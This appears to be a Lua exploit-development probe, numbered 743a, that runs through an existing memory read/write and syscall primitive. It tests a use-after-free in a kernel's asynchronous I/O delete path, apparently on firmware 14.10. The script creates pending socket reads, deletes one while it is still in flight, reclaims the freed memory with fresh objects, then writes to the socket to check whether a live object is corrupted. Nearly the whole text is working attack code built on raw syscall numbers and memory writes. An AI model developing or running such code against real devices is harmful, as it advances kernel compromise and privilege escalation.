-- CRASH_CLASS: HIGH
-- PROBE 743a: delete an aio object while its read is still in flight
--
-- 731a showed a block create of two socket reads polls 2 (in flight) on 14.10,
-- so submit is live. The delete path frees S, P, W, D, T and C without looking
-- at the state of the work beyond the 3/4 gate, and 14.10 has no [W+0x18] guard
-- in path B. If a pending object can be deleted, the socket worker is left
-- holding freed sub-objects.
--
-- A: create two pending reads, poll (expect 2)
-- B: delete id1 while pending
-- C: if accepted, reclaim with fresh creates, then feed the socket and see
--    whether the completed read damages a live object
-- No SIGSYS shield in this probe: every number used is a live handler.

print("=== PROBE 743a: DELETE A PENDING AIO OBJECT ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local sc_mmap = mk(477); local sc_pair = mk(135); local sc_write = mk(6); local sc_close = mk(6)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local fn_ud = syscall.pipe.fn_addr
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(uint64(a1), uint64(a2), uint64(a3), uint64(a4), uint64(a5), uint64(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end
print("[A] pid="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))

local fds = to_num(memory.alloc(64)); wq(fds, uint64(0))
print("[A] socketpair -> "..tostring(call(sc_pair, 1, 1, 0, fds, 0, 0)))
local fd = rd(fds); local peer = rd(fds+4)
print(string.format("[A] fd=%d peer=%d", fd, peer))

local D = to_num(memory.alloc(0x4000)); local buf = to_num(memory.alloc(0x4000)); local res = to_num(memory.alloc(0x4000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400))
zero(buf, 0x4000); zero(res, 0x4000); zero(st, 0x400)
local function desc(at)
    wq(at+0x00, uint64(0)); wq(at+0x08, uint64(16))
    wq(at+0x10, uint64(buf)); wq(at+0x18, uint64(res))
    wd(at+0x20, fd); wd(at+0x24, 0)
end
desc(D); desc(D+0x28)
wd(ids, 0)
print(string.format("[A] block create n=2 ret=%s base=%08X",
    tostring(call(mk(669), 1+0x1000, D, 2, 1, ids, 0)), rd(ids)))
local base = rd(ids)
if base == 0 or base == -1 then print("[A] create failed, stop") return end

wd(ids, base); wd(ids+4, base+0x10000)
print(string.format("[A] poll ret=%s id0=%08X id1=%08X",
    tostring(call(mk(664), ids, 2, st, 0, 0, 0)), rd(st), rd(st+4)))
if rd(st) ~= 2 then print("[A] not in flight, stopping (state above)") return end

local ds = to_num(memory.alloc(0x400)); zero(ds, 0x400)
wd(ids, base+0x10000)
local dr = call(mk(662), ids, 1, ds, 0, 0, 0)
print(string.format("[B] delete pending id1 ret=%s status=%08X", tostring(dr), rd(ds)))
if rd(ds) ~= 0 then print("[B] delete refused for a pending object, probe done") return end

-- reclaim: two fresh one-shot creates land in the freed chunks
local d2 = to_num(memory.alloc(0x400)); local o2 = to_num(memory.alloc(0x400)); local s2 = to_num(memory.alloc(0x400))
wq(d2, uint64(0)); wq(d2+8, uint64(16)); wq(d2+0x10, uint64(buf+0x100)); wq(d2+0x18, uint64(res+0x100))
wd(d2+0x20, fd); wd(d2+0x24, 0)
local live = {}
for i=1,4 do
    wd(o2, 0)
    local r = call(mk(669), 1, d2, 1, 1, o2, 0)
    live[i] = rd(o2)
    print(string.format("[C] reclaim create %d ret=%s id=%08X", i, tostring(r), live[i]))
end
wd(ids, live[1]); wd(ids+4, live[2])
if live[1] and live[1] ~= 0 and live[1] ~= -1 then
    print(string.format("[C] poll reclaim -> %s id0=%08X id1=%08X",
        tostring(call(mk(664), ids, 2, s2, 0, 0, 0)), rd(s2), rd(s2+4)))
end

print("[D] writing 16 bytes to the peer")
local w = to_num(memory.alloc(64))
for k=0,3 do wd(w+k*4, 0x43434343) end
print("[D] write -> "..tostring(call(sc_write, peer, w, 16, 0, 0, 0)))
sleep_ms(60)
for i=1,4 do
    if live[i] and live[i] ~= 0 and live[i] ~= -1 then
        wd(ids, live[i])
        call(mk(664), ids, 1, s2, 0, 0, 0)
        print(string.format("[E] live %d id=%08X state=%08X res=%08X", i, live[i], rd(s2), rd(res+0x100)))
    end
end
print(string.format("[E] fault page: res[0..3]=%X %X %X %X", rd(res), rd(res+4), rd(res+8), rd(res+12)))
print("[F] health="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))
print("=== 743a DONE ===")
